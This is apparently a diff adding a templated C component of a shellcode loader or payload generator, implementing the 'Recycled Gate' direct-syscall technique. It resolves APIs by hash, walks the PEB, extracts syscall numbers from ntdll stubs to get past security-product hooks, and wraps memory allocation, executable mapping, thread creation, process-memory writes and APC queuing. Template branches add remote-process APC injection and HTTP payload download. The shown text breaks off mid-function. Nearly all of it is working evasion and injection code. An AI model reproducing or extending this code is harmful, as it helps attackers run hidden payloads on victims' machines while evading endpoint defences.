@@ -1,0 +1,719 @@
+// --- Recycled Gate Implementation ---
+// Based on the work by various researchers on Hell's Gate / Halo's Gate / Recycled Gate
+
+#include <stddef.h> // For offsetof
+
+#ifndef CONTAINING_RECORD
+#define CONTAINING_RECORD(address, type, field) ((type *)( \
+                                                  (PCHAR)(address) - \
+                                                  (ULONG_PTR)(&((type *)0)->field)))
+#endif
+
+#define HASH_KEY 0x41424344
+#define SYS_STUB_SIZE 32
+#define UP -32
+#define DOWN 32
+
+typedef struct _SYSCALL_ENTRY {
+    DWORD dwSyscallNr;
+    PVOID pRecycledGate;
+} SYSCALL_ENTRY, *PSYSCALL_ENTRY;
+
+// --- Struct definitions ---
+// We rely on winternl.h for UNICODE_STRING and standard structs.
+// But we need some specific LDR definitions for walking the module list manually.
+
+typedef struct _RG_LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    // ...
+} RG_LDR_DATA_TABLE_ENTRY, *PRG_LDR_DATA_TABLE_ENTRY;
+
+typedef struct _RG_PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+} RG_PEB_LDR_DATA, *PRG_PEB_LDR_DATA;
+
+typedef struct _RG_PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    union {
+        BOOLEAN BitField;
+        struct {
+            BOOLEAN ImageUsesLargePages : 1;
+            BOOLEAN IsProtectedProcess : 1;
+            BOOLEAN IsImageDynamicallyRelocated : 1;
+            BOOLEAN SkipPatchingUser32Forwarders : 1;
+            BOOLEAN IsPackagedProcess : 1;
+            BOOLEAN IsAppContainer : 1;
+            BOOLEAN IsProtectedProcessLight : 1;
+            BOOLEAN IsLongPathAwareProcess : 1;
+        };
+    };
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PRG_PEB_LDR_DATA Ldr;
+    // ...
+} RG_PEB, *PRG_PEB;
+
+// --- 1. Define Typedefs for all required function pointers (Copied from api_resolver_hashed) ---
+typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
+typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef VOID (WINAPI *pRtlMoveMemory)(VOID UNALIGNED *, const VOID UNALIGNED *, SIZE_T);
+typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
+typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
+typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef NTSTATUS (WINAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (WINAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
+typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
+typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
+typedef BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);
+typedef BOOL (WINAPI *pCreateDecompressor)(DWORD, PVOID, PDECOMPRESSOR_HANDLE);
+typedef BOOL (WINAPI *pDecompress)(DECOMPRESSOR_HANDLE, LPCVOID, SIZE_T, PVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI *pCloseDecompressor)(DECOMPRESSOR_HANDLE);
+typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
+typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
+typedef DWORD (WINAPI *pSleepEx)(DWORD, BOOL);
+typedef BOOL (WINAPI *pGetComputerNameA)(LPSTR, LPDWORD);
+{% if execution_method == 'remoteapc' or guardrails_needed %}
+typedef int (WINAPI* pLstrlenA)(LPCSTR);
+typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
+{% endif %}
+{% if execution_method == 'remoteapc' %}
+typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
+typedef DWORD (WINAPI* pResumeThread)(HANDLE);
+typedef DWORD (WINAPI* pGetLastError)(VOID);
+typedef NTSTATUS (WINAPI *pNtCreateJobObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+typedef NTSTATUS (WINAPI *pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
+typedef NTSTATUS (WINAPI *pNtAssignProcessToJobObject)(HANDLE, HANDLE);
+{% endif %}
+{% if data_source == 'embedded' %}
+typedef HRSRC (WINAPI* pFindResourceA)(HMODULE, LPCSTR, LPCSTR);
+typedef HGLOBAL (WINAPI* pLoadResource)(HMODULE, HRSRC);
+typedef LPVOID (WINAPI* pLockResource)(HGLOBAL);
+typedef DWORD (WINAPI* pSizeofResource)(HMODULE, HRSRC);
+{% endif %}
+{% if data_source == 'http' %}
+typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, const LPCWSTR *, DWORD);
+typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
+typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
+typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTSW);
+typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
+typedef BOOL (WINAPI *pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
+{% endif %}
+{% if guardrails_needed %}
+typedef NTSTATUS (WINAPI *pLsaOpenPolicy)(PLSA_UNICODE_STRING, PLSA_OBJECT_ATTRIBUTES, ACCESS_MASK, PLSA_HANDLE);
+typedef NTSTATUS (WINAPI *pLsaQueryInformationPolicy)(LSA_HANDLE, POLICY_INFORMATION_CLASS, PVOID*);
+typedef NTSTATUS (WINAPI *pLsaFreeMemory)(PVOID);
+typedef NTSTATUS (WINAPI *pLsaClose)(LSA_HANDLE);
+{% endif %}
+
+// --- 2. Declare global variables (Copied from api_resolver_hashed) ---
+pLoadLibraryA pfnLoadLibraryA = NULL;
+pVirtualAlloc pfnVirtualAlloc = NULL;
+pCreateThread pfnCreateThread = NULL;
+pWaitForSingleObject pfnWaitForSingleObject = NULL;
+pCloseHandle pfnCloseHandle = NULL;
+pCreateFileMappingW pfnCreateFileMappingW = NULL;
+pMapViewOfFile pfnMapViewOfFile = NULL;
+pNtCreateSection pfnNtCreateSection = NULL;
+pNtMapViewOfSection pfnNtMapViewOfSection = NULL;
+pGetProcessHeap pfnGetProcessHeap = NULL;
+pHeapAlloc pfnHeapAlloc = NULL;
+pHeapFree pfnHeapFree = NULL;
+pCreateDecompressor pfnCreateDecompressor = NULL;
+pDecompress pfnDecompress = NULL;
+pCloseDecompressor pfnCloseDecompressor = NULL;
+pCreateFileA pfnCreateFileA = NULL;
+pGetFileSize pfnGetFileSize = NULL;
+pReadFile pfnReadFile = NULL;
+pRtlMoveMemory pfnRtlMoveMemory = NULL;
+pRtlZeroMemory pfnRtlZeroMemory = NULL;
+pSleepEx pfnSleepEx = NULL;
+pGetComputerNameA pfnGetComputerNameA = NULL;
+{% if execution_method == 'remoteapc' or guardrails_needed %}
+pLstrlenA pfnLstrlenA = NULL;
+pGetEnvironmentVariableA pfnGetEnvironmentVariableA = NULL;
+{% endif %}
+{% if execution_method == 'remoteapc' %}
+pCreateProcessA pfnCreateProcessA = NULL;
+pVirtualAllocEx pfnVirtualAllocEx = NULL;
+pWriteProcessMemory pfnWriteProcessMemory = NULL;
+pVirtualProtectEx pfnVirtualProtectEx = NULL;
+pQueueUserAPC pfnQueueUserAPC = NULL;
+pResumeThread pfnResumeThread = NULL;
+pGetLastError pfnGetLastError = NULL;
+pNtCreateJobObject pfnNtCreateJobObject = NULL;
+pNtSetInformationJobObject pfnNtSetInformationJobObject = NULL;
+pNtAssignProcessToJobObject pfnNtAssignProcessToJobObject = NULL;
+{% endif %}
+{% if data_source == 'embedded' %}
+pFindResourceA pfnFindResourceA = NULL;
+pLoadResource pfnLoadResource = NULL;
+pLockResource pfnLockResource = NULL;
+pSizeofResource pfnSizeofResource = NULL;
+{% endif %}
+{% if data_source == 'http' %}
+pWinHttpOpen pfnWinHttpOpen = NULL;
+pWinHttpConnect pfnWinHttpConnect = NULL;
+pWinHttpOpenRequest pfnWinHttpOpenRequest = NULL;
+pWinHttpSendRequest pfnWinHttpSendRequest = NULL;
+pWinHttpReceiveResponse pfnWinHttpReceiveResponse = NULL;
+pWinHttpQueryDataAvailable pfnWinHttpQueryDataAvailable = NULL;
+pWinHttpReadData pfnWinHttpReadData = NULL;
+pWinHttpCloseHandle pfnWinHttpCloseHandle = NULL;
+pWinHttpCrackUrl pfnWinHttpCrackUrl = NULL;
+pWinHttpSetOption pfnWinHttpSetOption = NULL;
+pWinHttpQueryHeaders pfnWinHttpQueryHeaders = NULL;
+{% endif %}
+{% if guardrails_needed %}
+pLsaOpenPolicy pfnLsaOpenPolicy = NULL;
+pLsaQueryInformationPolicy pfnLsaQueryInformationPolicy = NULL;
+pLsaFreeMemory pfnLsaFreeMemory = NULL;
+pLsaClose pfnLsaClose = NULL;
+{% endif %}
+
+// --- Helper Functions ---
+
+unsigned long rg_djb2(unsigned char* str) {
+    unsigned long hash = 5381;
+    int c;
+    while ((c = *str++))
+        hash = ((hash << 5) + hash) + c;
+    return hash;
+}
+
+unsigned long rg_xor_hash(unsigned long hash) {
+    return hash ^ HASH_KEY;
+}
+
+PVOID rg_findNtDll(void) {
+    PRG_PEB pPeb = (PRG_PEB)__readgsqword(0x60);
+    PRG_PEB_LDR_DATA pLdrData = pPeb->Ldr;
+    PLIST_ENTRY listHead = &pLdrData->InMemoryOrderModuleList;
+    PLIST_ENTRY currentEntry = listHead->Flink;
+
+    DWORD target_hash = rg_xor_hash({{ hash_ntdll_dll }}); 
+
+    while (currentEntry != listHead) {
+        PRG_LDR_DATA_TABLE_ENTRY pModuleEntry = (PRG_LDR_DATA_TABLE_ENTRY)((PBYTE)currentEntry - offsetof(RG_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
+
+        if (pModuleEntry->BaseDllName.Buffer) {
+            unsigned long hash = 5381;
+            WCHAR* str = pModuleEntry->BaseDllName.Buffer;
+            while (*str) {
+                wchar_t c = *str;
+                // Convert to uppercase to match Python's hash_ntdll_dll ("NTDLL.DLL")
+                if (c >= L'a' && c <= L'z') c -= 32;
+                hash = ((hash << 5) + hash) + c;
+                str++;
+            }
+            
+            if (rg_xor_hash(hash) == target_hash) {
+                return pModuleEntry->DllBase;
+            }
+        }
+        currentEntry = currentEntry->Flink;
+    }
+    
+    DEBUG_PRINT("rg_findNtDll: Failed to find NTDLL.DLL!");
+    return NULL;
+}
+
+DWORD getSyscall(DWORD dwCryptedHash, PSYSCALL_ENTRY pSyscall) {
+    PVOID pNtdllBase = rg_findNtDll();
+    if (!pNtdllBase) return 0;
+
+    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pNtdllBase;
+    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHdr->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
+    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNames);
+    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);
+
+    PVOID pStub = NULL;
+    PVOID pGate = NULL;
+    DWORD dwSyscallNr = 0;
+    
+    // Find the function by hash
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+        char* funcName = (char*)((PBYTE)pNtdllBase + pdwAddrOfNames[i]);
+        if (rg_djb2((unsigned char*)funcName) == rg_xor_hash(dwCryptedHash)) {
+            pStub = (PVOID)((PBYTE)pNtdllBase + pdwAddrOfFunctions[pwAddrOfNameOrdinales[i]]);
+            break;
+        }
+    }
+
+    if (!pStub) {
+        DEBUG_PRINT("getSyscall: Failed to find function with hash 0x%X in NTDLL exports", dwCryptedHash);
+        return 0;
+    }
+
+    for (int i = 0; i < SYS_STUB_SIZE; i++) {
+        if (*((PBYTE)pStub + i) == 0x4c && *((PBYTE)pStub + i + 1) == 0x8b && 
+            *((PBYTE)pStub + i + 2) == 0xd1 && *((PBYTE)pStub + i + 3) == 0xb8 &&
+            *((PBYTE)pStub + i + 6) == 0x00 && *((PBYTE)pStub + i + 7) == 0x00) { // mov r10, rcx; mov eax, imm32; ...
+            
+            BYTE low = *((PBYTE)pStub + i + 4);
+            BYTE high = *((PBYTE)pStub + i + 5);
+            dwSyscallNr = (high << 8) | low;
+            break;
+        }
+    }
+    
+    if (dwSyscallNr == 0) { // Fallback for different stub structures
+         for (int idx = 1; idx <= 32; idx++) { // Check for stubs like: mov r10, rcx; mov eax, imm16; ...
+             PBYTE pNeighbor = (PBYTE)pStub + idx * 32;
+             if (*((PBYTE)pNeighbor) == 0x4c && *((PBYTE)pNeighbor + 1) == 0x8b && 
+                *((PBYTE)pNeighbor + 2) == 0xd1 && *((PBYTE)pNeighbor + 3) == 0xb8) { // mov r10, rcx; mov eax, imm16
+                 BYTE low = *((PBYTE)pNeighbor + 4);
+                 BYTE high = *((PBYTE)pNeighbor + 5);
+                 dwSyscallNr = (high << 8) | low - idx; // Adjust syscall number based on offset
+                 pStub = pNeighbor; 
+                 break;
+             }
+         }
+         if (dwSyscallNr == 0) { // Check for stubs with negative offsets
+             for (int idx = 1; idx <= 32; idx++) {
+                 PBYTE pNeighbor = (PBYTE)pStub - idx * 32;
+                 if (*((PBYTE)pNeighbor) == 0x4c && *((PBYTE)pNeighbor + 1) == 0x8b && 
+                    *((PBYTE)pNeighbor + 2) == 0xd1 && *((PBYTE)pNeighbor + 3) == 0xb8) { // mov r10, rcx; mov eax, imm16
+                     BYTE low = *((PBYTE)pNeighbor + 4);
+                     BYTE high = *((PBYTE)pNeighbor + 5);
+                     dwSyscallNr = (high << 8) | low + idx; // Adjust syscall number based on offset
+                     pStub = pNeighbor; 
+                     break;
+                 }
+             }
+         }
+    }
+
+    if (dwSyscallNr == 0) return 0;
+
+    // Find the syscall instruction (0x0f 0x05) followed by ret (0xc3)
+    for (int i = 0; i < SYS_STUB_SIZE; i++) {
+        if (*((PBYTE)pStub + i) == 0x0f && *((PBYTE)pStub + i + 1) == 0x05 && *((PBYTE)pStub + i + 2) == 0xc3) {
+            pGate = (PVOID)((PBYTE)pStub + i); // Point to the syscall instruction
+            break;
+        }
+    }
+
+    if (pGate) {
+        pSyscall->dwSyscallNr = dwSyscallNr;
+        pSyscall->pRecycledGate = pGate;
+        return 1;
+    }
+    return 0;
+}
+
+// --- Assembly Trampolines (MinGW Global ASM) ---
+__asm__( 
+    ".text\n"
+    ".global PrepareSyscall\n"
+    "PrepareSyscall:\n"
+    "    mov %rcx, %r11\n"
+    "    mov %rdx, %r10\n"
+    "    ret\n"
+);
+
+__asm__( 
+    ".text\n"
+    ".global DoSyscall\n"
+    "DoSyscall:\n"
+    "    push %r10\n" 
+    "    xor %rax, %rax\n"
+    "    mov %rcx, %r10\n" // Move first arg (rcx) to r10
+    "    mov %r11d, %eax\n" // Move SSN from r11 to eax
+    "    ret\n" // Returns to Gate (syscall; ret)
+);
+
+// Declare them for C
+extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
+extern NTSTATUS DoSyscall(PVOID Arg1, ...); 
+
+// --- Wrappers ---
+
+SYSCALL_ENTRY g_NtAllocateVirtualMemory = {0};
+SYSCALL_ENTRY g_NtProtectVirtualMemory = {0};
+SYSCALL_ENTRY g_NtCreateThreadEx = {0};
+SYSCALL_ENTRY g_NtWaitForSingleObject = {0};
+SYSCALL_ENTRY g_NtCreateSection = {0};
+SYSCALL_ENTRY g_NtMapViewOfSection = {0};
+SYSCALL_ENTRY g_NtWriteVirtualMemory = {0};
+SYSCALL_ENTRY g_NtQueueApcThread = {0};
+SYSCALL_ENTRY g_NtClose = {0};
+
+void InitSyscall(DWORD hash, PSYSCALL_ENTRY pEntry) {
+    if (pEntry->pRecycledGate == NULL) {
+        getSyscall(hash, pEntry);
+    }
+}
+
+LPVOID WINAPI RG_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
+    InitSyscall({{ hash_rg_ntallocatevirtualmemory }}, &g_NtAllocateVirtualMemory);
+    if (!g_NtAllocateVirtualMemory.pRecycledGate) return NULL;
+
+    PVOID baseAddress = lpAddress;
+    SIZE_T regionSize = dwSize;
+    
+    PrepareSyscall(g_NtAllocateVirtualMemory.dwSyscallNr, g_NtAllocateVirtualMemory.pRecycledGate);
+    NTSTATUS status = DoSyscall(
+        (HANDLE)-1, 
+        &baseAddress,
+        (ULONG_PTR)0,
+        &regionSize,
+        flAllocationType,
+        flProtect
+    );
+    
+    if (status >= 0) return baseAddress;
+    DEBUG_PRINT("RG_VirtualAlloc: NtAllocateVirtualMemory failed with status: 0x%08X", status);
+    return NULL;
+}
+
+DWORD WINAPI RG_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
+    InitSyscall({{ hash_rg_ntwaitforsingleobject }}, &g_NtWaitForSingleObject);
+    if (!g_NtWaitForSingleObject.pRecycledGate) return -1;
+    
+    LARGE_INTEGER timeout;
+    PLARGE_INTEGER pTimeout = NULL;
+    
+    if (dwMilliseconds != INFINITE) {
+        timeout.QuadPart = -(LONGLONG)dwMilliseconds * 10000;
+        pTimeout = &timeout;
+    }
+
+    PrepareSyscall(g_NtWaitForSingleObject.dwSyscallNr, g_NtWaitForSingleObject.pRecycledGate);
+    NTSTATUS status = DoSyscall(hHandle, FALSE, pTimeout);
+
+    if (status == 0x00000000) return 0;
+    if (status == 0x00000102) return 258;
+    return -1;
+}
+
+// CreateThread -> NtCreateThreadEx
+HANDLE WINAPI RG_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+    InitSyscall({{ hash_rg_ntcreatethreadex }}, &g_NtCreateThreadEx);
+    if (!g_NtCreateThreadEx.pRecycledGate) return NULL;
+    
+    HANDLE hThread;
+    ULONG createFlags = (dwCreationFlags & 0x00000004) ? 1 : 0; // Map CREATE_SUSPENDED (4) to Nt flag (1)
+    
+    PrepareSyscall(g_NtCreateThreadEx.dwSyscallNr, g_NtCreateThreadEx.pRecycledGate);
+    // NtCreateThreadEx(&hThread, ACCESS, NULL, ProcessHandle, StartAddr, Param, Flags, ZeroBits, StackSize, MaxStackSize, AttrList)
+    NTSTATUS status = DoSyscall(
+        &hThread,
+        (ACCESS_MASK)0x1FFFFF, // THREAD_ALL_ACCESS
+        NULL,
+        (HANDLE)-1,
+        lpStartAddress,
+        lpParameter,
+        createFlags, 
+        (ULONG_PTR)0, 
+        (SIZE_T)0, 
+        (SIZE_T)0, 
+        NULL
+    );
+
+    if (status >= 0) {
+        if (lpThreadId) *lpThreadId = (DWORD)0;
+        return hThread;
+    }
+    
+    DEBUG_PRINT("RG_CreateThread: NtCreateThreadEx failed with status: 0x%08X", status);
+    return NULL;
+}
+
+HANDLE WINAPI RG_CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName) {
+    InitSyscall({{ hash_rg_ntcreatesection }}, &g_NtCreateSection);
+    if (!g_NtCreateSection.pRecycledGate) return NULL;
+    
+    HANDLE hSection;
+    LARGE_INTEGER maxSize;
+    maxSize.LowPart = dwMaximumSizeLow;
+    maxSize.HighPart = dwMaximumSizeHigh;
+    
+    DWORD allocationAttributes = SEC_COMMIT;
+    
+    PrepareSyscall(g_NtCreateSection.dwSyscallNr, g_NtCreateSection.pRecycledGate);
+    NTSTATUS status = DoSyscall(
+        &hSection,
+        (ACCESS_MASK)SECTION_ALL_ACCESS,
+        NULL,
+        &maxSize,
+        flProtect, 
+        allocationAttributes,
+        hFile
+    );
+    
+    if (status >= 0) return hSection;
+    DEBUG_PRINT("RG_CreateFileMappingW: NtCreateSection failed with status: 0x%08X", status);
+    return NULL;
+}
+
+LPVOID WINAPI RG_MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap) {
+    InitSyscall({{ hash_rg_ntmapviewofsection }}, &g_NtMapViewOfSection);
+    if (!g_NtMapViewOfSection.pRecycledGate) return NULL;
+    
+    PVOID baseAddress = NULL;
+    SIZE_T viewSize = dwNumberOfBytesToMap;
+    LARGE_INTEGER sectionOffset;
+    sectionOffset.LowPart = dwFileOffsetLow;
+    sectionOffset.HighPart = dwFileOffsetHigh;
+    
+    PrepareSyscall(g_NtMapViewOfSection.dwSyscallNr, g_NtMapViewOfSection.pRecycledGate);
+    NTSTATUS status = DoSyscall(
+        hFileMappingObject,
+        (HANDLE)-1,
+        &baseAddress,
+        (ULONG_PTR)0,
+        (SIZE_T)0,
+        &sectionOffset,
+        &viewSize,
+        2, 
+        0,
+        PAGE_EXECUTE_READWRITE 
+    );
+    
+    if (status >= 0) return baseAddress;
+    DEBUG_PRINT("RG_MapViewOfFile: NtMapViewOfSection failed with status: 0x%08X", status);
+    return NULL;
+}
+
+BOOL WINAPI RG_CloseHandle(HANDLE hObject) {
+    InitSyscall({{ hash_rg_ntclose }}, &g_NtClose);
+    if (!g_NtClose.pRecycledGate) return FALSE;
+    
+    PrepareSyscall(g_NtClose.dwSyscallNr, g_NtClose.pRecycledGate);
+    NTSTATUS status = DoSyscall(hObject);
+    return (status >= 0);
+}
+
+DWORD WINAPI RG_QueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData) {
+    InitSyscall({{ hash_rg_ntqueueapcthread }}, &g_NtQueueApcThread);
+    if (!g_NtQueueApcThread.pRecycledGate) return 0;
+    
+    PrepareSyscall(g_NtQueueApcThread.dwSyscallNr, g_NtQueueApcThread.pRecycledGate);
+    NTSTATUS status = DoSyscall(
+        hThread,
+        pfnAPC,
+        dwData,
+        NULL,
+        NULL
+    );
+    
+    if (status >= 0) return 1;
+    return 0;
+}
+
+BOOL WINAPI RG_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, PSIZE_T lpNumberOfBytesWritten) {
+    InitSyscall({{ hash_rg_ntwritevirtualmemory }}, &g_NtWriteVirtualMemory);
+    if (!g_NtWriteVirtualMemory.pRecycledGate) return FALSE;
+    
+    SIZE_T bytesWritten = 0;
+    
+    PrepareSyscall(g_NtWriteVirtualMemory.dwSyscallNr, g_NtWriteVirtualMemory.pRecycledGate);
+    NTSTATUS status = DoSyscall(
+        hProcess,
+        lpBaseAddress,
+        (PVOID)lpBuffer,
+        nSize,
+        &bytesWritten
+    );
+    
+    if (lpNumberOfBytesWritten) *lpNumberOfBytesWritten = bytesWritten;
+    
+    return (status >= 0);
+}
+
+// --- Standard Resolver Helpers ---
+DWORD RG_HashString(const char* str) {
+    DWORD hash = 5381;
+    int c;
+    while ((c = *str++)) { hash = ((hash << 5) + hash) + c; }
+    return hash;
+}
+
+HMODULE RG_GetModuleHandleByHash(DWORD dwModuleNameHash) {
+    if (dwModuleNameHash == 0) return NULL;
+    PRG_PEB pPeb = (PRG_PEB)(__readgsqword(0x60));
+    PRG_PEB_LDR_DATA pLdr = pPeb->Ldr;
+    PLIST_ENTRY listHead = &(pLdr->InMemoryOrderModuleList);
+    PLIST_ENTRY currentEntry = listHead->Flink;
+    while (currentEntry != listHead) {
+        PRG_LDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(currentEntry, RG_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        if (pDte->FullDllName.Length > 0) {
+             char upperDllName[MAX_PATH];
+            DWORD i = 0;
+            while (pDte->FullDllName.Buffer[i] && i < MAX_PATH - 1) {
+                char c = (char)pDte->FullDllName.Buffer[i];
+                if (c >= 'a' && c <= 'z') { upperDllName[i] = c - 32; } 
+                else { upperDllName[i] = c; }
+                i++;
+            }
+            upperDllName[i] = '\0';
+            char* last_slash = strrchr(upperDllName, '\\');
+            char* module_name = last_slash ? last_slash + 1 : upperDllName;
+            if (RG_HashString(module_name) == dwModuleNameHash) {
+                return (HMODULE)pDte->DllBase;
+            }
+        }
+        currentEntry = currentEntry->Flink;
+    }
+    return NULL;
+}
+
+FARPROC RG_GetProcAddressByHash(HMODULE hModule, DWORD dwApiNameHash) {
+    if (hModule == NULL || dwApiNameHash == 0) return NULL;
+    PBYTE pBase = (PBYTE)hModule;
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
+        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+        if (dwApiNameHash == RG_HashString(pFunctionName)) {
+            return (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+        }
+    }
+    return NULL;
+}
+
+
+void ResolveAPIs() {
+    DWORD KERNEL32_HASH = {{ hash_kernel32_dll }};
+    HMODULE hKernel32 = RG_GetModuleHandleByHash(KERNEL32_HASH);
+    
+    pfnLoadLibraryA = (pLoadLibraryA)RG_GetProcAddressByHash(hKernel32, {{ hash_loadlibrarya }});
+    pfnGetProcessHeap = (pGetProcessHeap)RG_GetProcAddressByHash(hKernel32, {{ hash_getprocessheap }});
+    pfnCreateFileA = (pCreateFileA)RG_GetProcAddressByHash(hKernel32, {{ hash_createfilea }});
+    pfnGetFileSize = (pGetFileSize)RG_GetProcAddressByHash(hKernel32, {{ hash_getfilesize }});
+    pfnReadFile = (pReadFile)RG_GetProcAddressByHash(hKernel32, {{ hash_readfile }});
+    pfnSleepEx = (pSleepEx)RG_GetProcAddressByHash(hKernel32, {{ hash_sleepex }});
+    
+    pfnVirtualAlloc = (pVirtualAlloc)RG_VirtualAlloc;
+    pfnCreateThread = (pCreateThread)RG_CreateThread;
